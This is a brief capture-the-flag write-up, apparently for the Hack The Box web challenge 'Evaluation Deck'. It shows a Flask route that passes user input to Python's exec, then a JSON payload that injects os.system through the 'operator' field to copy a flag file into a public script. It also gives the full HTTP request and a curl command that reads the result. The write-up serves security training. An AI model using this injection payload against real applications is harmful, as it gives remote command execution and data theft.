
#### vulnerable part

```text
web_evaluation_deck\challenge\application\blueprints\routes.py
```

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
```

#### payload

```json
{
"current_health" :"1",
"attack_power" : "2",
"operator" : ";__import__('os').system('cat ../flag.txt >> /app/application/static/js/ui.js')#"
}
```


```javascript
POST /api/get_health HTTP/1.1
Host: 161.35.36.157:30900
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 148

{
"current_health" :"1",
"attack_power" : "2",
"operator" : ";__import__('os').system('cat ../flag.txt >> /app/application/static/js/ui.js')#"
}
```

```bash
┌──(kali㉿Zeus)-[~]
└─$ curl http://161.35.36.157:30900/static/js/ui.js
.....
HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```

